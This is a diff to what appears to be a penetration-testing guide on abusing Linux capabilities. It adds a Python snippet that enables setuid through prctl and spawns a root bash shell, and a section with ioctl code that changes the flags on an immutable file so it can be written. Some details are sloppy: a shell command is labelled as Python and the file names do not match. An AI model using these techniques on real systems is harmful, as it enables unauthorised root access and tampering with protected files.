@@ -1145,6 +1145,17 @@ os.setuid(0)
 os.system("/bin/bash")
 ```
 
+**Another way:**
+
+```python
+import os
+import prctl
+#add the capability to the effective set
+prctl.cap_effective.setuid = True
+os.setuid(0)
+os.system("/bin/bash")
+```
+
 ### CAP\_SETGID
 
 **This means that it's possible to set the effective group id of the created process.**
@@ -1351,6 +1362,46 @@ pprint.pprint(json)
 import iptc
 iptc.easy.flush_table('filter')
 ```
+
+### CAP\_LINUX\_IMMUTABLE
+
+**This means that it's possible modify inode attributes.** You cannot escalate privileges directly with this capability.
+
+#### Example with binary
+
+If you find that a file is immutable and python has this capability, you can **remove the immutable attribute and make the file modifiable:**
+
+```python
+#Check that the file is imutable
+lsattr file.sh 
+----i---------e--- backup.sh
+```
+
+```python
+#Pyhton code to allow modifications to the file
+import fcntl
+import os
+import struct
+
+FS_APPEND_FL = 0x00000020
+FS_IOC_SETFLAGS = 0x40086602
+
+fd = os.open('/path/to/file.sh', os.O_RDONLY)
+f = struct.pack('i', FS_APPEND_FL)
+fcntl.ioctl(fd, FS_IOC_SETFLAGS, f)
+
+f=open("/path/to/file.sh",'a+')
+f.write('New content for the file\n')
+```
+
+{% hint style="info" %}
+Note that usually this immutable attribute is set and remove using:
+
+```bash
+sudo chattr +i file.txt
+sudo chattr -i file.txt
+```
+{% endhint %}
 
 ## References
 
